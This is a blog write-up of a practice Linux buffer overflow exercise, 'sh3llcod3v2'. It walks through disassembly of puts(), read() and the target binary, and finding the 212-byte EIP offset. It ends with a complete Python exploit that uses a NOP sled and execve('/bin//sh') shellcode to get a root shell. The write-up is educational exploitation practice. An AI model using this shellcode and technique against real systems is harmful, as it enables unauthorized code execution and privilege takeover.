---
title: "Linux Buffer Overflow Practice: Sh3llcod3v2"
date: 2019-09-08T02:48:44+02:00
tags:
  - writeup
  - binary-exploitation
showdate: true
toc: true
---

One day a friend sent me a Linux buffer overflow exercise he was asked to solve, so I happily gave him a hand and dag a bit deeper than needed with the "reverse engineering" (which was just taking a look at how C functions would olook like in ASM) just for fun and to become more familiar with x86 ASM, so what came out of it was this bunch of notes on a very simple binary, how it works, and how I exploited it. Nothing too fancy. The binary is called "sh3llcod3v2" and I couldn't find it anywhere so I have no clue where he got it from, I hope I'm not breaking any rules by posting this. Also I apologize for the excessive use of images instead of text on this writeup, but the shared clipboard wouldn't work on Ubuntu so it's either this or nothing.

---

## Function analysis: puts()

![img](/images/shellcodev2/0.png)

Before we analyze the executable it would be better to know how the standard functions it uses work. Because of that we are going to see a few prototypes in C and how they look like after they've been compiled. First of all we can use ltrace to see which library calls the program performs during runtime:

![img](/images/shellcodev2/1.png)

From this output we can tell the program uses *printf* to show the banner, *puts* to output strings for the rest of the program, and finally *read* to receive a string in input, which apparently can be up to 1000 characters long. *setvbuf* is also used to set the behavior of the stdin and stdout buffers, I'll explain it a bit more in detail when we come to the disassembling bit (I didn't include the prototypes for *setvbuf* out of laziness, sorry about that). We can start our analysis of the prototypes from *puts*, by simply outputting a simple string. We can consult the Linux man pages to see which arguments it needs and what behavior to expect:

![img](/images/shellcodev2/2.png)


So the only argument puts needs is a string, and it will be written on to stdout with a \n at the end, so we don't have to include it ourselves in the string:

![img](/images/shellcodev2/3.png)

Now we can examine its disassembly:

![img](/images/shellcodev2/4.png)

---

## Function analysis: read() + for loop

Next on the list is *read*, let's see its description again from the Linux man pages:

![img](/images/shellcodev2/5.png)

With this information we can write another short test program in C:

![img](/images/shellcodev2/6.png)

Notice how after receiving the string in input we cycle through all its characters to delete the final \n, because the *read* function will include it in the final string, and we need that character out of the way in order to display the final message correctly. Using this *for* loop will also make the code a little longer, but more interesting as well, here it is, heavily commented to describe what happens at every little step:

![img](/images/shellcodev2/7.png)

The code above will be very helpful to understand our vulnerable program.

---

## Analyzing the target


Armed with this knowledge we can go back to our vulnerable executable and see how it works. Here are some useful strings obtained with the *strings* command from the gdb command line (+ PEDA.py to help with the exploit development process), we can use these to better understand the behavior of the program:

![img](/images/shellcodev2/8.png)

Now we can disassemble the program by starting from the *main* function:

![img](/images/shellcodev2/9.png)

This *main* function dictates how to treat the stdin and stdout buffers during runtime, prints the banner, and then passes execution to the *prog* function, which looks like this:

![img](/images/shellcodev2/10.png)

All this function does is allocating around 200 bytes of fresh memory on the stack and passing a pointer to that memory region to the *get_name* function. Once *get_name* returns the content of that very same memory region is printed out with *printf* through the %s format string. Still nothing too interesting here, but at least we know how big the buffer should be now. Let's check out the get_name function then, time to squint the eyes:

![img](/images/shellcodev2/11.png)

Good, now we know exactly what the program does, how, and where our data will be saved. To be specific, the program will ask for a name but will stop the normal flow if it encounters any null byte (0x00) in our string. Because null bytes are used to terminate strings and the *read* function will read up to 999 characters, we have to trick the program by sending a string that is at least 999 characters long, so the terminator character will be the 1000th character and the function won't read it, thus continuing execution.

A thousand bytes are a lot to work with but this should also make our job easy because we aren't restricted to short shellcodes, even if I'm going to use one because of convenience. So let's get our hands dirty. First of all we need to know exactly after how many bytes we will reach the instruction pointer, in order to do that we generate a very long never-repeating string that will be used as input, it will crash the program, and we can see the content of EIP to get what offset of the string overwritten it. Using PEDA makes this task very easy:

![img](/images/shellcodev2/12.png)

Once we press enter the program will crash and we will get a view of the current status of the memory and every register:

![img](/images/shellcodev2/13.png)

The debugger tells us we run into a SIGSEGV error, so a segmentation fault, the program tried to access a memory address it had no control over, meaning EIP has been altered and in fact we can see its value is 0x25412425, hexadecimal representation of the string "%$A%". We can now see where exactly that sub-string is at in our original input, to know what offset of the input will overwrite EIP allowing us to redirect it wherever we want:

![img](/images/shellcodev2/14.png)

Good, we know we will need 212 bytes of data before we can overwrite the instruction pointer, so we can start working on our exploit now.

---

## Writing the exploit

There is more than one approach, we can check what security measures are enabled on the executable to evaluate which are the most convenient:

![img](/images/shellcodev2/15.png)

There isn't a single exploit prevention system enabled (except for ASLR on our own computer), and we know the buffer will always be located at the hard-coded memory address 0x804c060 as we have seen in the disassembly, so we might as well inject some shellcode in the buffer and jump to it since the stack is executable. I like writing my exploits in Python so here is a rough draft of one:

```python
import struct
import sys

# this variable contains the address that will overwrite EEIP, it's exactly where our
# buffer begins, where it fill find a NOP sled that leads to the shellcode
jmp_address = struct.pack("<I", 0x804c060)

# a simple null-free execve() shellcode, for a total of 23 bytes
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

# first NOP sled that leads to the shellcode
sled1 = "\x90" * 60

# another sled, this one will just fill the space between the shellcode and
# jmp_address, so sled1 + shellcode + sled2 = 212 bytes
sled2 = "\x90" * 129

# the rest of the input can be random garbage, we need it only to have at least
# 999 bytes of null-free data
junk = "A" * 800

# craft the actual payload
payload = sled1 + shellcode + sled2 + jmp_address + junk

# and feed it to the vulnerable program
print payload
sys.stdout.flush()
```

The shellcode was taken [here](http://shell-storm.org/shellcode/files/shellcode-827.php).

```shell-session
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
```


This is the original ASM code:

```asm
xor    %eax,%eax
push   %eax
push   $0x68732f2f
push   $0x6e69622f
mov    %esp,%ebx
push   %eax
push   %ebx
mov    %esp,%ecx
mov    $0xb,%al
int    $0x80
```


Basically it calls the execve() system call giving it the string "/bin//sh" as parameter. The double slash is needed to fit the string in exactly 8 bytes, we need it to be 8 bytes long or else it would be filled with zeros, and the program would reject it. We can now launch the exploit:

![img](/images/shellcodev2/16.png)

And it worked! Here is a short description of what these last steps did:

- Used python + cat to launch the exploit and pass its output to the input of the vulnerable program
- The program runs its course until it jumps to our shellcode and spawns a shell. Unfortunately this is a non-interactive shell, so...
- We use Python to spawn a new instance of /bin/bash so we have a semi-interactive shell
- Profit! Because we are root we can do anything we please, in this case I listed the content of /root/ as proof of the superuser privileges


Fun challenge indeed. A big thank you goes to Chappie for sending it to me and suggesting the use of cat, the exploit wouldn't work before. Cheers!

